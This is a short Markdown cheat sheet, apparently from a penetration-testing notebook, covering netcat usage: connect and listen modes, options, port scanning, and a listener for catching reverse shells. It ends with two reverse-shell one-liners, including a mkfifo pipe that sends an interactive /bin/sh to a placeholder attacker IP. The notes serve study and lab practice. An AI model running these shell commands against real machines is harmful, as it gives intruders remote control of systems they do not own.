---
tags:
  - Tools
  - Networking
  - Shell
---
## Function
>*reading/writing data across TCP or UDP connections, port scanning, transferring files, and — relevant here — setting up listeners and shells.*
---
###  Usage : 
#### Connect Mode :
```shell
nc [options] <destination> <port>
```

#### Listen Mode :
```shell
nc -l [options] <port>
```
### Options : 
| Option | Value | Description                                                                      |
| ------ | ----- | -------------------------------------------------------------------------------- |
| `-l`   |       | Listen mode                                                                      |
| `-p`   | port  | Local source port, where the reverse connection should be sent to.               |
| `-v`   |       | Show connection info                                                             |
| `-n`   |       | Disable DNS resolution and only connect from/to IPs, to speed up the connection. |

---
### Common patterns

**Listener (your side of a reverse shell):**

```shell
nc -lvnp <port>
```

**Connect to a service (banner grab / manual talk):**

```shell
nc -v <destination> <port>
```

**Port scan:**

```shell
nc -zv <destination> <start-port>-<end-port>
```

### The `-e` problem (important)

Since OpenBSD `nc` has no `-e`, this **won't work** on your Kali:

```shell
nc <your-ip> <port> -e /bin/bash   # fails — no -e in OpenBSD nc
```

Standard OpenBSD workaround using a FIFO (named pipe):

```shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <your-ip> <port> > /tmp/f
```
### Others :
- For further information please use manual page.

---
## Related Source : 